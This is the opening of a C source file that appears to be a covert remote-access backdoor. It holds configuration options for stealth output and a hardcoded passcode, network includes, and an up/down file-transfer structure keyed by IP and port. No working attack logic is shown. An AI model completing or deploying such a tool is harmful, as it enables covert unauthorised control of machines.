/****************************
 * Set this to your likings *
 ****************************/

/* Uncomment if you don't want any output on the screen */
//#define STEALTH

/* Uncomment if you are a lamer ;^)
 * This disable checks for stupid commands */
//#define IMALAMER

/* Change the passcode! */
#define PASS "hard"

/* Uncomment this if you don't want notice 
 * of logged in users (i'd keep it enabled) */

#define CHECKROOT

/****************************
 *       END SETTINGS       *
 ****************************/

#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <getopt.h>
#include <netdb.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

struct xfer_struct
{
  char file[255];
  int dir;
  int mode;
  char *ip;
  int port;
};

enum DIR
{
  DOWN,
  UP
};
